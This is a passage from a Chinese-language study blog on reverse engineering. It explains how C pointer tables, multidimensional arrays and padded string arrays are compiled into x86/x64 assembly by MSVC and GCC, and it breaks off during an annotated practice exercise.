string">&lt;stdio.h></span></span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> month1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"January"</span><span class="token punctuation">,</span>        <span class="token string">"February"</span><span class="token punctuation">,</span>        <span class="token string">"March"</span><span class="token punctuation">,</span>        <span class="token string">"April"</span><span class="token punctuation">,</span>        <span class="token string">"May"</span><span class="token punctuation">,</span>        <span class="token string">"June"</span><span class="token punctuation">,</span>        <span class="token string">"July"</span><span class="token punctuation">,</span>        <span class="token string">"August"</span><span class="token punctuation">,</span>        <span class="token string">"September"</span><span class="token punctuation">,</span>        <span class="token string">"October"</span><span class="token punctuation">,</span>        <span class="token string">"November"</span><span class="token punctuation">,</span>        <span class="token string">"December"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// in 0..11 range</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">get_month1</span> <span class="token punctuation">(</span><span class="token keyword">int</span> month<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> month1<span class="token punctuation">[</span>month<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><p>msvs x64</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_DATA   SEGMENTmonth1  DQ      FLAT:$SG3122        DQ      FLAT:$SG3123        DQ      FLAT:$SG3124        DQ      FLAT:$SG3125        DQ      FLAT:$SG3126        DQ      FLAT:$SG3127        DQ      FLAT:$SG3128        DQ      FLAT:$SG3129        DQ      FLAT:$SG3130        DQ      FLAT:$SG3131        DQ      FLAT:$SG3132        DQ      FLAT:$SG3133$SG3122 DB     &#39;January&#39;, 00H$SG3123 DB     &#39;February&#39;, 00H$SG3124 DB     &#39;March&#39;, 00H$SG3125 DB     &#39;April&#39;, 00H$SG3126 DB     &#39;May&#39;, 00H$SG3127 DB     &#39;June&#39;, 00H$SG3128 DB     &#39;July&#39;, 00H$SG3129 DB     &#39;August&#39;, 00H$SG3130 DB     &#39;September&#39;, 00H$SG3156 DB     &#39;%s&#39;, 0aH, 00H$SG3131 DB     &#39;October&#39;, 00H$SG3132 DB     &#39;November&#39;, 00H$SG3133 DB     &#39;December&#39;, 00H_DATA   ENDSmonth$ &#x3D; 8get_month1 PROC         movsxd  rax, ecx         lea     rcx, OFFSET FLAT:month1         mov     rax, QWORD PTR [rcx+rax*8]         ret     0get_month1 ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><mark>MOVSXD</mark>把ECX的32位整型数值、连同其符号扩展位(sign-extension)扩展为64位整型数据，再存储于RAX寄存器中。ECX存储的“月份”信息是32位整形数据。因为程序随后还要进行64位运算，所以需要把输入变量转换为64位值。</li><li>然后函数把<code>指针表的地址存储于RCX寄存器。</code></li><li>最后，函数的输<code>入变量(month)的值乘以8、再与指针表的地址相加</code>。因为是64位系统的缘故，每个地址（即指针）的数据需要占用64位（即8字节）。所以指针表中的每个元素都占用8字节空间。因此，最终字符串的地址要加上month*8。MOV指令不仅完成了字符串地址的计算，而且还完成了指针表的查询。在输入值为1时，函数将返回字符串“February”的指针地址。</li></ul><hr /><p><code>Optimizing gcc</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movsx   rdi, edi     mov     rax, QWORD PTR month1[0+rdi*8]     ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr /><p><code>Optimizing MSVS</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_month$ &#x3D; 8_get_month1 PROC        mov     eax, DWORD PTR _month$[esp-4]        mov     eax, DWORD PTR _month1[eax*4]        ret     0_get_month1 ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32位程序就不用把输入值转化为64位数据了。此外，32位系统的指针属于4字节数据，所以相关的计算因子变为了4。</p><h3 id="多维数组"><a class="markdownIt-Anchor" href="#多维数组"></a> 多维数组</h3><p>计算机内存是连续的线性空间，它可以与一维数组直接对应。在被拆分成多个一维数组之后，多维数组与内栈线性空间同样存在直接对应的存储关系。</p><table><thead><tr><th>存储地址</th><th>数组元素</th></tr></thead><tbody><tr><td>0</td><td>[0] [0]</td></tr><tr><td>1</td><td>[0] [1]</td></tr><tr><td>2</td><td>[0] [2]</td></tr><tr><td>3</td><td>[0] [3]</td></tr><tr><td>4</td><td>[1] [0]</td></tr><tr><td>5</td><td>[1] [1]</td></tr><tr><td>6</td><td>[1] [2]</td></tr><tr><td>7</td><td>[1] [3]</td></tr><tr><td>8</td><td>[2] [0]</td></tr><tr><td>9</td><td>[2] [1]</td></tr><tr><td>10</td><td>[2] [2]</td></tr><tr><td>11</td><td>[2] [3]</td></tr></tbody></table><p>在内存之中，3×4的二维数组将依次存储为连续的12个元素，如表18.2所示。</p><p>在<code>计算上述数组中某个特定元素的内存存储编号时，可以先将二维索引号的第一个索引号乘以4（矩阵宽度），而后加上第二个索引号。</code>这种方式就是C/C++、Python所用的“行优先的顺序”（row-majororder）。<mark>所谓行优先，就是先用第一行排满第一个索引号下的所有元素，然后再依次编排其他各行。</mark></p><p><code>从性能及缓存的角度来看，与数据的存储方案（scheme)和组织方式（data organization）匹配的优先顺序最优</code>。只要相互匹配，那么程序就可以连续访问数据，整体性能就会提高。所以，如果程序以“逐行”的方式访问数据，那么就应当以行优先的顺序组织数组；反之亦然。</p><hr /><p>显然根据这种规则我们可以利用一维数组的方式访问二维数组</p><p>例如</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token function">get_by_coordinates1</span> <span class="token punctuation">(</span><span class="token keyword">char</span> array<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> array<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token function">get_by_coordinates2</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>array<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// treat input array as one-dimensional</span>        <span class="token comment">// 4 is array width here</span>        <span class="token keyword">return</span> array<span class="token punctuation">[</span>a<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> <span class="token function">get_by_coordinates3</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>array<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// treat input array as pointer,</span>        <span class="token comment">// calculate address, get value at it</span>        <span class="token comment">// 4 is array width here</span>        <span class="token keyword">return</span> <span class="token operator">*</span><span class="token punctuation">(</span>array<span class="token operator">+</span>a<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123</span><span class="token punctuation">;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token function">get_by_coordinates1</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token function">get_by_coordinates2</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token function">get_by_coordinates3</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><p><code>Optimizing gcc</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; RDI&#x3D;address of array; RSI&#x3D;a; RDX&#x3D;bget_by_coordinates1:; sign-extend input 32-bit int values &quot;a&quot; and &quot;b&quot; to 64-bit ones        movsx   rsi, esi        movsx   rdx, edx        lea     rax, [rdi+rsi*4]; RAX&#x3D;RDI+RSI*4&#x3D;address of array+a*4        movzx   eax, BYTE PTR [rax+rdx]; AL&#x3D;load byte at address RAX+RDX&#x3D;address of array+a*4+b        retget_by_coordinates2:        lea     eax, [rdx+rsi*4]; RAX&#x3D;RDX+RSI*4&#x3D;b+a*4        cdqe        movzx   eax, BYTE PTR [rdi+rax]; AL&#x3D;load byte at address RDI+RAX&#x3D;address of array+b+a*4        retget_by_coordinates3:        sal     esi, 2; ESI&#x3D;a&lt;&lt;2&#x3D;a*4; sign-extend input 32-bit int values &quot;a*4&quot; and &quot;b&quot; to 64-bit ones        movsx   rdx, edx        movsx   rsi, esi        add     rdi, rsi; RDI&#x3D;RDI+RSI&#x3D;address of array+a*4        movzx   eax, BYTE PTR [rdi+rdx]; AL&#x3D;load byte at address RDI+RDX&#x3D;address of array+a*4+b        ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>三者汇编很接近并且计算的下标是一样的</p><hr /><p>多维数组的情况也差不多，例如三维</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        a<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>z<span class="token punctuation">]</span><span class="token operator">=</span>value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>msvs x86</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_DATA      SEGMENTCOMM       _a:DWORD:01770H_DATA      ENDSPUBLIC     _insert_TEXT      SEGMENT_x$ &#x3D; 8               ; size &#x3D; 4_y$&#x3D;12                ; size &#x3D; 4_z$&#x3D;16                ; size &#x3D; 4_value$ &#x3D; 20          ; size &#x3D; 4_insert     PROC    push    ebp    mov     ebp, esp    mov     eax, DWORD PTR _x$[ebp]    imul    eax, 2400                ; eax&#x3D;600*4*x    mov     ecx, DWORD PTR _y$[ebp]    imul    ecx, 120                 ; ecx&#x3D;30*4*y    lea     edx, DWORD PTR _a[eax+ecx]; edx&#x3D;a + 600*4*x + 30*4*y    mov     eax, DWORD PTR _z$[ebp]    mov     ecx, DWORD PTR _value$[ebp]    mov     DWORD PTR [edx+eax*4], ecx; *(edx+z*4)&#x3D;value    pop     ebp    ret     0_insert     ENDP_TEXT       ENDS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>数组元素地址=600×4<em>x</em> + 30×4<em>y</em> + 4<em>z</em>。32位系统里int类型是32位（4字节）数据，所以要每项都要乘以4。</p><hr /><p><code>gcc</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">           public  insertinsert     proc nearx          &#x3D; dword ptr 8y          &#x3D; dword ptr  0Chz          &#x3D; dword ptr  10hvalue      &#x3D; dword ptr  14h           push    ebp           mov     ebp, esp           push    ebx           mov     ebx, [ebp+x];ebx&#x3D;x           mov     eax, [ebp+y];eax&#x3D;y           mov     ecx, [ebp+z];ecx&#x3D;z           lea     edx, [eax+eax]              ; edx&#x3D;y*2           mov     eax, edx                    ; eax&#x3D;y*2           shl     eax, 4                      ; eax&#x3D;(y*2)&lt;&lt;4 &#x3D; y*2*16 &#x3D; y*32           sub     eax, edx                    ; eax&#x3D;y*32 - y*2&#x3D;y*30           imul    edx, ebx, 600               ; edx&#x3D;x*600           add     eax, edx                    ; eax&#x3D;eax+edx&#x3D;y*30 + x*600           lea     edx, [eax+ecx]              ; edx&#x3D;y*30 + x*600 + z           mov     eax, [ebp+value]           mov     dword ptr ds:a[edx*4], eax  ; *(a+edx*4)&#x3D;value           pop     ebx           pop     ebp           retninsert     endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>gcc在计算30y进行了优化;(<em>y</em> + <em>y</em>) &lt;&lt; 4 − (<em>y</em> + <em>y</em>) = (2 <em>y</em>)&lt;&lt; 4 − 2 <em>y</em> = 2×16<em>y</em> − 2 <em>y</em> = 32 <em>y</em> − 2 <em>y</em> = 30 <em>y</em></li></ul><hr /><p>计算机的显示屏幕是一个2D显示空间，但是显存却是一个一维线性数组。</p><h3 id="二维字符串数组的封装格式"><a class="markdownIt-Anchor" href="#二维字符串数组的封装格式"></a> 二维字符串数组的封装格式</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token keyword">const</span> <span class="token keyword">char</span> month2<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">&#123;</span> <span class="token char">'J'</span><span class="token punctuation">,</span><span class="token char">'a'</span><span class="token punctuation">,</span><span class="token char">'n'</span><span class="token punctuation">,</span><span class="token char">'u'</span><span class="token punctuation">,</span><span class="token char">'a'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span><span class="token char">'y'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'F'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span><span class="token char">'u'</span><span class="token punctuation">,</span><span class="token char">'a'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span><span class="token char">'y'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'M'</span><span class="token punctuation">,</span><span class="token char">'a'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span><span class="token char">'c'</span><span class="token punctuation">,</span><span class="token char">'h'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'A'</span><span class="token punctuation">,</span><span class="token char">'p'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span><span class="token char">'i'</span><span class="token punctuation">,</span><span class="token char">'l'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'M'</span><span class="token punctuation">,</span><span class="token char">'a'</span><span class="token punctuation">,</span><span class="token char">'y'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'J'</span><span class="token punctuation">,</span><span class="token char">'u'</span><span class="token punctuation">,</span><span class="token char">'n'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'J'</span><span class="token punctuation">,</span><span class="token char">'u'</span><span class="token punctuation">,</span><span class="token char">'l'</span><span class="token punctuation">,</span><span class="token char">'y'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'A'</span><span class="token punctuation">,</span><span class="token char">'u'</span><span class="token punctuation">,</span><span class="token char">'g'</span><span class="token punctuation">,</span><span class="token char">'u'</span><span class="token punctuation">,</span><span class="token char">'s'</span><span class="token punctuation">,</span><span class="token char">'t'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'S'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'p'</span><span class="token punctuation">,</span><span class="token char">'t'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'m'</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'O'</span><span class="token punctuation">,</span><span class="token char">'c'</span><span class="token punctuation">,</span><span class="token char">'t'</span><span class="token punctuation">,</span><span class="token char">'o'</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'N'</span><span class="token punctuation">,</span><span class="token char">'o'</span><span class="token punctuation">,</span><span class="token char">'v'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'m'</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span> <span class="token char">'D'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'c'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'m'</span><span class="token punctuation">,</span><span class="token char">'b'</span><span class="token punctuation">,</span><span class="token char">'e'</span><span class="token punctuation">,</span><span class="token char">'r'</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// in 0..11 range</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">get_month2</span> <span class="token punctuation">(</span><span class="token keyword">int</span> month<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token operator">&amp;</span>month2<span class="token punctuation">[</span>month<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Optimizing msvs</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">month2  DB      04aH        DB      061H        DB      06eH        DB      075H        DB      061H        DB      072H        DB      079H        DB      00H        DB      00H        DB      00H...get_month2 PROC; sign-extend input argument and promote to 64-bit value        movsxd  rax, ecx        lea     rcx, QWORD PTR [rax+rax*4]; RCX&#x3D;month+month*4&#x3D;month*5        lea     rax, OFFSET FLAT:month2; RAX&#x3D;pointer to table        lea     rax, QWORD PTR [rax+rcx*2]; RAX&#x3D;pointer to table + RCX*2&#x3D;pointer to table + month*5*2&#x3D;pointer to table + month*10        ret     0get_month2  ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>上述程序完全不访问内存。整个函数的功能，只是计算月份名称字符串的首字母指针pointer_to_the_table+month*10。它使用单条LEA指令，替代了多条MUL和MOV指令。</p></li><li><p>上述数组的每个字符串都占用10字节空间。最长的字符串由“September”和内容为零的字节构成，其余的字符串使用零字节对齐，所以每个字符串都占用10个字节。如此一来，计算字符串首地址的方式变得简单，整个函数的效率也会有所提高。</p></li></ul><hr /><p><code>Optimizing gcc</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movsx   rdi, edi    lea     rax, [rdi+rdi*4]    lea     rax, month2[rax+rax]    ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>直接使用LEA指令进行乘以10的计算</p><hr /><p><code>Not Optimizing GCC</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">get_month2:        push    rbp        mov     rbp, rsp        mov     DWORD PTR [rbp-4], edi        mov     eax, DWORD PTR [rbp-4]        movsx   rdx, eax; RDX &#x3D; sign-extended input value        mov     rax, rdx; RAX &#x3D; month        sal     rax, 2; RAX &#x3D; month&lt;&lt;2 &#x3D; month*4        add     rax, rdx; RAX &#x3D; RAX+RDX &#x3D; month*4+month &#x3D; month*5        add     rax, rax; RAX &#x3D; RAX*2 &#x3D; month*5*2 &#x3D; month*10        add     rax, OFFSET FLAT:month2; RAX &#x3D; month*10 + pointer to the table        pop     rbp        ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不开启优化编译，GCC的乘法运算方式不同</p><hr /><p><code>Not Optimizing MSVS</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">month$ &#x3D; 8get_month2 PROC        mov      DWORD PTR [rsp+8], ecx        movsxd   rax, DWORD PTR month$[rsp]; RAX &#x3D; sign-extended input value into 64-bit one        imul     rax, rax, 10; RAX &#x3D; RAX*10        lea      rcx, OFFSET FLAT:month2; RCX &#x3D; pointer to the table        add      rcx, rax; RCX &#x3D; RCX+RAX &#x3D; pointer to the table+month*10        mov      rax, rcx; RAX &#x3D; pointer to the table+month*10        mov      ecx, 1; RCX &#x3D; 1        imul     rcx, rcx, 0; RCX &#x3D; 1*0 &#x3D; 0        add      rax, rcx; RAX &#x3D; pointer to the table+month*10 + 0 &#x3D; pointer to the table+month*10        ret      0get_month2 ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>msvs不开启优化，会直接使用imul指令，然而为什么RCX要乘以0？作者说这是MSVS的怪癖代码，希望我们从编程人员的角度来理解程序的源代码</li></ul><h3 id="problem-4"><a class="markdownIt-Anchor" href="#problem-4"></a> Problem</h3><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 函数开始?s@@YAXPAN00@Z PROC; s, COMDAT; 将参数加载到寄存器中    mov    eax, DWORD PTR _b$[esp-4]  ; eax &#x3D; 结束地址 - 4 (实际是_b的地址)    mov    ecx, DWORD PTR _a$[esp-4]  ; ecx &#x3D; 起始地址 - 4(a的地址)    mov    edx, DWORD PTR _c$[esp-4]  ; edx &#x3D; 结果存放地址 - 4(c的地址); 保存寄存器edi和esi，用于循环,因为此后edi和esi作为计数器,    push   esi      push   edi    ; 计算数组长度，两次减法实质上得到的是_b - _a的值，即元素个数，但这里是用字节数表示的    sub    ecx, eax                  ; ecx &#x3D; 起始地址与结束地址之间的距离（字节数）    sub    edx, eax                  ; edx同样调整，确保结果存回原区间; 设置外层循环次数为200次（每次处理两个浮点数，合计处理400个浮点数）    mov    edi, 200     ; 000000c8H;edi&#x3D;i$LL6@s:                              ; 外层循环开始    push   100          ; 00000064H   ; 内层循环计数器，每次处理100对浮点数    popesi;esi&#x3D;100,作为计数器$LL3@s:                              ; 内层循环开始    fld    QWORD PTR [ecx+eax]      ; 将当前地址的浮点数推入FPU堆栈    fadd   QWORD PTR [eax]          ; 将源地址的浮点数与栈顶的浮点数相加    fstp   QWORD PTR [edx+eax]      ; 将结果从堆栈弹出并存回目的地址    add    eax, 8                   ; eax指针向前移动8字节，指向下一个浮点数    